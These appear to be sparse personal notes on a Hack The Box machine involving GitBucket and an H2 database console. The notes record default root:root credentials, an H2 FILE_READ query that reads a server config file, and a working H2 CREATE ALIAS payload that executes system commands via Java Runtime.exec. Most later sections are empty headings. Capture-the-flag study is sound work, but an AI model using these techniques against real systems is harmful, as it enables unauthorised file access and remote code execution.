| Name            | Caption                                                         |
| --------------- | --------------------------------------------------------------- |
| Platform        | HTB                                                             |
| Difficulty      | Hard                                                            |
| OS              | Linux                                                           |
| Used techniques | default credentials, command injection, code review, repositorz |
| Technologies    | gitbucket, Apache Thrift, go                                    |
| Tools           | python                                                          |
| CVEs            | none                                                            |

## Enumeration


git bucket
default creds: root:root
h2 database panel admin
SELECT CAST(FILE_READ('/etc/apache2/conf-available/apache2.conf', NULL) AS VARCHAR(10000));


### Directories






### subdomains



## Foothold



```sql
CREATE ALIAS REVEXEC AS $$ String shellexec(String cmd) throws java.io.IOException{
    java.util.Scanner s=new
    java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
    return s.hasNext() ? s.next() : ""; }$$;


CALL REVEXEC('id')

```


## Lateral Movement




## Privilege Escalation


gitbucket 

#### Developed map



#### Sources
[[https://medium.com/r3d-buck3t/chaining-h2-database-vulnerabilities-for-rce-9b535a9621a2]]